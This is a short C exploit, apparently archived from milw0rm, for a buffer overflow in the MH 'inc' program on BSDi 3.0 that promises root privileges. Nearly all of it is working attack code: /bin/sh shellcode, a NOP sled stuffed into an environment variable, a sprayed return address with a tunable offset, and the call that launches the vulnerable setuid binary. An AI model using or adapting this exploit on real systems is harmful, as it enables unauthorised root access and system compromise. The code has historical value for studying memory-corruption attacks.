/*
   (BSDi)inc[mh] buffer overflow, by v9[v9@fakehalo.org].
   this is will give you euid=0(root) on BSDi/3.0 systems.
*/

#define PATH		"/usr/contrib/mh/bin/inc"  /* path to inc on BSDi/3.0 */
#define BUFFER		2048                       /* no need to change this. */
#define DEFAULT_OFFSET	-7000                      /* generalized offset.     */

static char exec[]=
 "\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c" /* 14 characters. */
 "\x89\x76\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff" /* 14 characters. */
 "\xff\xff\xff\x07\xff\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e" /* 14 characters. */
 "\x2f\x73\x68\x00";                    /* 4 characters; 46 characters total. */

long pointer(void){__asm__("movl %esp,%eax");}
int main(int argc,char **argv){
  char eip[BUFFER],buf[4096];
  int i,offset;
  long ret;
  printf("[ (BSDi)inc[mh]: buffer overflow, by: v9[v9@fakehalo.org]. ]\n");
  if(argc>1){offset=atoi(argv[1]);}
  else{offset=DEFAULT_OFFSET;}
  ret=(pointer()-offset);
  eip[0]=0x01;eip[1]=0x01;eip[2]=0x01;
  for(i=3;i<BUFFER;i+=4){*(long *)&eip[i]=ret;}
  eip[BUFFER]=0x0;
  for(i=0;i<(4096-strlen(exec)-strlen(eip));i++){*(buf+i)=0x90;}
  memcpy(buf+i,exec,strlen(exec));
  memcpy(buf,"EXEC=",5);putenv(buf);
  printf("*** [data]: return address: 0x%lx, offset: %d.\n",ret,offset);
  if(execlp(PATH,"inc","-file",eip,0)){
    printf("*** [error]: could not execute %s successfully.\n",PATH);
    exit(1);
  }
}


// milw0rm.com [2000-11-30]